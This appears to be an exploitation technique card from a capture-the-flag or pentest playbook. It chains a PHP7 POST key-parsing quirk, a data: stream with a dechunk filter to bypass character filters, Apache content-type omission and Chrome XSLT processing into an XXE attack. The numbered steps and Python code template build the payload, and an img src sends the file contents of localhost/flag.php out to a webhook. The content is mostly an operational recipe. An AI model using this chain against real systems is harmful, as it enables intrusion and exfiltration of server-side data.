---
name: php7_array_key_dechunk_chrome_xslt_xxe
vuln_type: xxe
sub_technique: php7_array_key_xslt_xxe
category: exploitation
safety_level: cautious
tags:
- php7
- array-key
- dechunk
- stream-filter
- xslt
- xxe
- chrome
- bot
---

# Php7 Name[Name Name Array Key Injection + Data: Dechunk Stream → Chrome Xslt Xxe Entity Exfil

## When to Apply

upload.php reads `$_POST['name_name name']` but PHP7 parses `name[name name` as a different key. A filter field accepts `resource=data:,<chunked_b64>|dechunk` which bypasses `.`/`/` character restrictions. Empty name → saved as `.png` → Apache omits Content-Type → Chrome sniffs as XML. Bot (JS disabled) still processes XSLT. XSL with `<!ENTITY SYSTEM>` reads localhost/flag.php.

## Prerequisites

- PHP7 POST key parsing quirk (bracket→underscore transformation)
- Stream filter accepting data: scheme with dechunk wrapper
- Apache serving .png without explicit Content-Type header
- Chrome XSLT processing active even with JS disabled
- Bot visiting uploaded file URL
- Webhook endpoint for exfiltration

## Steps

1. Build XSL payload with `<!ENTITY xxe SYSTEM 'http://localhost/flag.php'>`.
2. Build XML: `<?xml-stylesheet type='text/xsl' href='data:text/plain;base64,{xsl_b64}'?><a/>`
3. Base64-encode XML. Re-roll padding until no `/` in b64 output.
4. Construct dechunk stream: `resource=data:,{hex_len}%0D%0A{safe_b64}%0D%0A0%0D%0A%0D%0A|dechunk`
5. POST to /upload.php with `name[name name=` (empty) and `filter_filter_filter={stream}`.
6. File saved as `.png` (empty name). Find path from /list.php.
7. Submit path to /bot.php.
8. Chrome opens .png → no Content-Type → sniffs XML → processes XSLT → entity fetches localhost/flag.php → exfils to webhook via `<img src>`.
9. Poll webhook for flag.

## Code Template

```
xsl = ('<?xml version="1.0"?>'
       '<!DOCTYPE a [<!ENTITY xxe SYSTEM "http://localhost/flag.php">]>'
       '<xsl:stylesheet ...><xsl:template match="/a"><html>'
       f'<img><xsl:attribute name="src">{webhook}?d=&xxe;</xsl:attribute></img>'
       '</html></xsl:template></xsl:stylesheet>')
xml = f'<?xml-stylesheet type="text/xsl" href="data:text/plain;base64,{b64(xsl)}"?><a/>'
data = {'name[name name': '', 'filter_filter_filter': f'resource=data:,{chunk}|dechunk'}
```

## Examples

### Example 1

- **php_quirk**: name[name name → $_POST['name_name name'] (bracket→underscore)
- **dechunk**: Chunked transfer decoding as PHP stream filter
- **b64_constraint**: No / in base64 (re-roll with padding until safe)

Three separate quirks chained: PHP7 key parsing, Apache content-type omission for .png, and Chrome's XSLT engine processing even when JS is disabled. The dechunk stream filter is used to bypass character restrictions in the filter parameter.
